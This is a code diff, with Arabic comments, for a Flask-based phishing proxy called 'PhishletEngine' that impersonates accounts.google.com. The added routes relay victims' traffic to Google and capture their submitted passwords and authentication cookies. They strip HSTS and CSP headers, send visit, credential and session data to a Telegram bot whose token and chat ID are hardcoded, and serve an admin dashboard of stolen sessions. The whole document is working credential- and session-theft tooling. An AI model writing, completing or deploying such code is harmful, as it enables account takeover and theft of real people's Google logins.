@@ -10,7 +10,7 @@ from bs4 import BeautifulSoup
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# إعدادات التيليجرام (استخدم متغيرات البيئة للأمان)
+# إعدادات التيليجرام (يفضل استخدام متغيرات البيئة للأمان)
 TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc')
 TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '1367401179')
 
@@ -39,7 +39,6 @@ class PhishletEngine:
         except Exception as e:
             logging.error(f"Telegram error: {e}")
 
-    # 1. إشعار الزيارة (مرة واحدة لكل زائر)
     def notify_visit(self, ip, ua):
         msg = (
             f"👀 <b>New Visitor</b>\n"
@@ -48,7 +47,6 @@ class PhishletEngine:
         )
         self.send_to_telegram(msg)
 
-    # 2. إشعار بيانات الدخول
     def capture_creds(self, form_data):
         found = {}
         for field in self.creds_fields:
@@ -80,7 +78,6 @@ class PhishletEngine:
             logging.info(f"Credentials: {found}")
         return found
 
-    # 3. إشعار الجلسة الكاملة (مع تحقق من كوكيز المصادقة)
     def capture_full_session(self, cookies_jar, current_host, creds_data=None):
         cookies_dict = {}
         if hasattr(cookies_jar, 'get_dict'):
@@ -89,7 +86,6 @@ class PhishletEngine:
             for cookie in cookies_jar:
                 cookies_dict[cookie.name] = cookie.value
 
-        # التحقق من وجود كوكيز المصادقة الأساسية (لتجنب الإرسال العشوائي)
         auth_indicators = ['SAPISID', 'APISID', 'SSID', 'SID', 'LSID', 'HSID', 'NID',
                            '__Host-GAPS', 'ACCOUNT_CHOOSER', 'LSOSID', 'oauth_token',
                            'session', 'token', 'auth']
@@ -106,7 +102,6 @@ class PhishletEngine:
             }
             captured_sessions[session_id] = session_data
 
-            # إرسال عينة من الكوكيز (أول 10) لتجنب طول الرسالة
             sample_items = list(cookies_dict.items())[:10]
             cookie_sample = "\n".join([f"<code>{k}</code>: <code>{v[:50]}...</code>" for k, v in sample_items])
             if len(cookies_dict) > 10:
@@ -126,7 +121,6 @@ class PhishletEngine:
             return session_id
         return None
 
-    # باقي دوال إعادة الكتابة (advanced_rewrite) كما هي
     def advanced_rewrite(self, content, content_type, current_host):
         if not any(t in content_type for t in ['html', 'javascript', 'json']):
             return content
@@ -155,7 +149,6 @@ class PhishletEngine:
             logging.error(f"Rewrite error: {e}")
             return content
 
-# إنشاء كائن phishlet (نفس الإعدادات)
 phishlet = PhishletEngine(
     name='Google',
     target_domain='accounts.google.com',
@@ -184,11 +177,112 @@ phishlet = PhishletEngine(
 def check_visit():
     if request.path == '/' and 'visited' not in request.cookies:
         phishlet.notify_visit(request.remote_addr, request.headers.get('User-Agent', 'Unknown'))
-        # سنضع الكوكي بعد انتهاء الطلب
         @app.after_this_request
         def set_visit_cookie(response):
             response.set_cookie('visited', '1', max_age=3600)  # ساعة واحدة
             return response
 
-# باقي المسارات (admin/dashboard, admin/session, admin/cred, admin/clear, proxy) كما هي
-# ... (نفس الكود السابق مع تعديل بسيط لتمرير creds_data إلى capture_full_session)
+# المسارات الإدارية
+@app.route('/admin/dashboard')
+def admin_dashboard():
+    try:
+        return render_template(
+            'dashboard.html',
+            sessions=captured_sessions,
+            creds=captured_creds,
+            bot_username='Amrsavebot'
+        )
+    except Exception as e:
+        return f"Dashboard Error: {str(e)}", 500
+
+@app.route('/admin/session/<session_id>')
+def get_session(session_id):
+    if session_id in captured_sessions:
+        return make_response(
+            json.dumps(captured_sessions[session_id], indent=2, ensure_ascii=False),
+            200,
+            {'Content-Type': 'application/json; charset=utf-8'}
+        )
+    return "Session not found", 404
+
+@app.route('/admin/cred/<cred_id>')
+def get_cred(cred_id):
+    if cred_id in captured_creds:
+        return make_response(
+            json.dumps(captured_creds[cred_id], indent=2, ensure_ascii=False),
+            200,
+            {'Content-Type': 'application/json; charset=utf-8'}
+        )
+    return "Credential not found", 404
+
+@app.route('/admin/clear')
+def clear_sessions():
+    captured_sessions.clear()
+    captured_creds.clear()
+    return redirect(url_for('admin_dashboard'))
+
+@app.route('/', defaults={'path': ''})
+@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
+def proxy(path):
+    host = request.headers.get('Host', '').split(':')[0]
+    engine = phishlet
+
+    target_url = f"https://{engine.target_domain}/{path}"
+
+    headers = {}
+    for k, v in request.headers:
+        if k.lower() not in ['host', 'content-length', 'accept-encoding', 'connection']:
+            headers[k] = v
+
+    headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+    headers['Referer'] = f"https://{engine.target_domain}/"
+
+    captured_creds_data = None
+    if request.method == 'POST' and request.form:
+        captured_creds_data = engine.capture_creds(request.form.to_dict())
+
+    try:
+        resp = requests.request(
+            method=request.method,
+            url=target_url,
+            headers=headers,
+            cookies=request.cookies,
+            data=request.get_data(),
+            allow_redirects=False,
+            verify=False,
+            timeout=30
+        )
+
+        content = engine.advanced_rewrite(resp.content, resp.headers.get('Content-Type', ''), host)
+        proxy_resp = make_response(content)
+        proxy_resp.status_code = resp.status_code
+
+        excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding',
+                            'strict-transport-security', 'content-security-policy']
+        for n, v in resp.headers.items():
+            if n.lower() not in excluded_headers:
+                proxy_resp.headers[n] = v
+
+        for cookie_name, cookie_value in resp.cookies.items():
+            proxy_resp.set_cookie(
+                cookie_name, cookie_value,
+                domain=host, secure=True, httponly=True, samesite='Lax'
+            )
+
+        if resp.cookies:
+            engine.capture_full_session(resp.cookies, host, captured_creds_data)
+
+        if 'Location' in proxy_resp.headers:
+            location = proxy_resp.headers['Location']
+            new_location = location.replace(engine.target_domain, host)
+            proxy_resp.headers['Location'] = new_location
+
+        return proxy_resp
+
+    except Exception as e:
+        logging.error(f"Proxy error: {str(e)}")
+        return f"Service Unavailable", 503
+
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 10000))
+    app.run(host='0.0.0.0', port=port)
